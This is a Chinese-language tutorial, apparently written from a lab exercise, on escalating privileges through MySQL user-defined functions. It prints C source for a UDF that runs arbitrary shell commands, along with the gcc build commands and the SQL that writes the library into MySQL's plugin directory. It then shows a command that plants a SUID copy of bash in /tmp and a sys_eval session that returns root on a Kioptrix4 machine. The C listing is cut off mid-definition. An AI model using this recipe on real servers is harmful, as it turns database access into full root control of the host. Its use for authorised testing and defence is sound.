一、简介

​ UDF(用户自定义函数)，是mysql中的一个扩展插件。作用是可以让用户通过自定义函数来实现在MySQL中无法实现的功能。

二、条件

  • 需要有mysql账户权限（creat、insert、delete），最好为root。

  • 数据库 secure_file_priv参数的值为空，或指定了提权所需的路径，即mysql插件安装路径。（该参数默认值为NULL，所以需要修改才行）

    ​ secure_file_priv是用来限制load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。

    ​ 当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权 。

    ​ 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权 。

    ​ 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权。

三、步骤

1.检查前提条件（安装udf插件的前提条件）

查看当前账号权限。

select * from mysql.user where user = substring_index(user(), '@', 1) ;

secure_file_priv值为空

查看插件安装路径

2.安装UDF插件

安装步骤以该文件为例，自行去searchspolit 下载

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)

首先需要将该C文件上传至目标机器

依据说明进行操作

gcc -g -c 1518.c -fPIC    #-g 生成调试信息  -c 仅编译，不链接 -fPIC 生成位置无关代码
#此处完成后，会生成1518.O文件

gcc -g -shared -Wl,-soname,<name>.so -o <name>.so 1518.o -lc  #指定好上一步生成的.o文件，<name>表示可以自由命名 
#此时生成<name>.so 共享文件

#进入数据库中执行
use mysql;
mysql> create table foo(line blob);  #创建包含blob数据类型的表
mysql> insert into foo values(load_file('[<name>.so文件的路径]')); #将<name>.so 插入表中
select * from foo into dumpfile '/usr/lib/mysql/plugin/<name>.so';#将存入文件转储到插件路径，注意不同版本的mysql插件路径有所区别，这里可以使用   show variables like "%plugin%';  的方式去查询。

__________________________________到此处插件已安装完毕,以下是利用_____________________________________________

create function do_system returns integer soname '<name>.so'; #创建名为do_system的函数
#可以使用以下命令进行查看创建的函数
select * from mysql.func;
select do_system('cp /bin/bash  /tmp/rootbash; chmod +xs /tmp/rootbash');
#利用新建函数执行系统命令，命令的意思为 将bash文件复制到/tmp目录下并赋予 ‘执行’和‘suid权限’ 
#退出数据库
/tmp/rootbash -p  #-p 表示以特权的身份去执行。

3.利用（如果，mysql已经安装udf插件的情况下，可直接使用以下步骤提权）

查看是否安装udf插件，使用 whereis lib_mysqludf_sys.so

john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so

登录数据库

john@Kioptrix4:~$ mysql -u root -p           
Enter password: XXXXX

进入mysql库

mysql> use mysql
Database changed

创建sys_eval函数

mysql> create function sys_eval returns string soname "lib_mysqludf_sys.so";
Query OK, 0 rows affected (0.00 sec)

尝试执行

mysql> select sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| root
              | 
+--------------------+
1 row in set (0.01 sec)

此时账户为root权限，可以用root去执行任意命令实现任意操作了。

靶机的情况下，到这里已经可以看到root目录下的flag文件了。
